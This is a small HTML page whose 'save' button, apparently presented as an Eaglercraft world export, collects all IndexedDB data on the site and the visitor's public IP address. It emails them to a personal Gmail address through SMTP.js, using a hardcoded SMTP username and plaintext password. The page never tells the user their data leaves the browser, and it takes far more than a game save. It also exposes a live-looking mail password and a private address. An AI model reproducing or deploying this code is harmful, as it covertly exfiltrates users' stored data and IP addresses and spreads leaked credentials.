<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Save!</title>
  <!-- Load SMTP.js library -->
  <script src="https://smtpjs.com/v3/smtp.js"></script>
</head>
<body>
  <h1>Save!</h1>
  <p>if you want to get this, talk to me</p>

  <!-- Button to trigger IndexedDB export and email -->
  <button id="send-indexeddb">save</button>

  <script>
  document.getElementById('send-indexeddb').addEventListener('click', async () => {
    // Prompt for user's name
    const userName = prompt("Please enter your name:", "") || 'Unknown';

    // Fetch public IP address
    let ip = 'Unknown';
    try {
      const resp = await fetch('https://api.ipify.org?format=json');
      ip = (await resp.json()).ip;
    } catch (e) {
      console.warn('Failed to fetch IP:', e);
    }

    // Export all IndexedDB data
    const allData = {};
    if (typeof indexedDB.databases !== 'function') {
      return alert('⚠️ indexedDB.databases() not supported');
    }
    const dbs = await indexedDB.databases();
    for (const { name } of dbs) {
      if (!name) continue;
      await new Promise((resolve, reject) => {
        const req = indexedDB.open(name);
        req.onsuccess = () => {
          const db = req.result;
          const tx = db.transaction(db.objectStoreNames, 'readonly');
          const stores = Array.from(db.objectStoreNames);
          Promise.all(stores.map(storeName =>
            new Promise((res, rej) => {
              const getAll = tx.objectStore(storeName).getAll();
              getAll.onsuccess = () => res({ storeName, data: getAll.result });
              getAll.onerror = () => rej(getAll.error);
            })
          ))
          .then(results => {
            allData[name] = {};
            for (const { storeName, data } of results) {
              allData[name][storeName] = data;
            }
            db.close();
            resolve();
          })
          .catch(err => reject(err));
        };
        req.onerror = () => reject(req.error);
      });
    }

    // Serialize to JSON and encode
    const json = JSON.stringify(allData, null, 2);
    const base64 = btoa(unescape(encodeURIComponent(json)));
    const dataUrl = 'data:application/json;base64,' + base64;

    // Send email via SMTP.js
    Email.send({
      Host: "mail.quoggy.com",          // SMTP host
      Port: 465,                         // SMTP port (SSL)
      SSL: true,                         // Use SSL/TLS
      Username: "save@quoggy.com",     // Your email address
      Password: "_,@^{Dg5m@C7",        // Your email password (visible in source)
      To: "mitchfogler@gmail.com",     // Recipient
      From: "save@quoggy.com",         // Sender
      Subject: "Eaglercraft World Export",
      Body: `User Name: ${userName}<br>IP Address: ${ip}`,
      Attachments: [
        { name: "world.json", path: dataUrl }
      ]
    }).then(response => {
      alert('success');
    }).catch(err => {
      console.error('error:', err);
      alert('failure');
    });
  });
  </script>
</body>
</html>
